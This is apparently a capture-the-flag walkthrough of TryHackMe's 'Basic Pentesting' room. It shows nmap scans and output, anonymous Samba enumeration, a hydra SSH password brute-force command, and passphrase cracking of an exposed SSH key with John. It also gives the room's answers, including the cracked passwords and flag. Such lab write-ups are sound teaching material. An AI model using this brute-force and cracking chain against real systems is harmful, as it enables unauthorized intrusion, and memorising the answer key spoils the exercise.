# Basic Pentesting

This is a machine that allows you to practise web app hacking and privilege escalation

Room URL: https://tryhackme.com/room/basicpentestingjt

---

# Task 1

1. Deploy the machine and connect to our network

No answer needed.

2. Find the services exposed by the machine

An nmap port scan helped reveal the following:

```
$ nmap -sC -sV 10.10.243.130
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-08 20:59 CEST
Nmap scan report for 10.10.243.130
Host is up (0.072s latency).
Not shown: 996 closed ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 db:45:cb:be:4a:8b:71:f8:e9:31:42:ae:ff:f8:45:e4 (RSA)
|   256 09:b9:b9:1c:e0:bf:0e:1c:6f:7f:fe:8e:5f:20:1b:ce (ECDSA)
|_  256 a5:68:2b:22:5f:98:4a:62:21:3d:a2:e2:c5:a9:f7:c2 (ED25519)
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: BASIC2; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h20m00s, deviation: 2h18m34s, median: 0s
|_nbstat: NetBIOS name: BASIC2, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: basic2
|   NetBIOS computer name: BASIC2\x00
|   Domain name: \x00
|   FQDN: basic2
|_  System time: 2020-06-08T14:59:53-04:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2020-06-08T18:59:53
|_  start_date: N/A
```

So ssh, an apache webserver and some samba.

No answer needed.

3. What is the name of the hidden directory on the web server(enter name without /)?

I used gobuster to find this one. It quickly found the folder.

```
development
```

4. User brute-forcing to find the username & password

So let's try some samba enumeration with an existing nmap script. It seems we
can connect anonymously:

```
$ nmap --script smb-enum-shares.nse -p445 10.10.243.130
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-08 21:03 CEST
Nmap scan report for 10.10.243.130
Host is up (0.054s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares:
|   account_used: guest
|   \\10.10.243.130\Anonymous:
|     Type: STYPE_DISKTREE
|     Comment:
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\samba\anonymous
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.243.130\IPC$:
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (Samba Server 4.3.11-Ubuntu)
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|_    Current user access: READ/WRITE
```

Let's connect :)

Seems there's a file called `staff.txt` in a share with two names in them: jan
and kay, along with a note in the /development folder on the webserver saying
that jan's password is too simple.

No answer needed.

5. What is the username?

```
jan
```

6. What is the password?

Let's run hydra against the ssh server with the username `jan` and the
`rockyou.txt` wordlist.

```
hydra -l jan -P ~/projects/SecLists/Passwords/Leaked-Databases/rockyou.txt -t 4 ssh://10.10.243.130
```

After waiting a few minutes, the password is found.

```
armando
```

7. What service do you use to access the server(answer in abbreviation in all caps)?

```
ssh
```

8. Enumerate the machine to find any vectors for privilege escalation

It seems the user `kay` has a world readable private and public ssh key in his
homedir. Unfortunately there's a password on the key. Let's see if we can use
John to crack the password. It can, but my Mac refused to do it, so I switched
to Kali and retrieved the password straight away.

No answer needed.

9. What is the name of the other user you found(all lower case)?

```
kay
```

10. If you have found another user, what can you do with this information?

The SSH key of course :)

No answer needed.

11. What is the final password you obtain?

I SSH'd into the `kay` user with the ssh keyfile and the password found via
john. In the homedir of `kay` is a file called `pass.bak` which contains the
flag.

```
heresareallystrongpasswordthatfollowsthepasswordpolicy$$
```
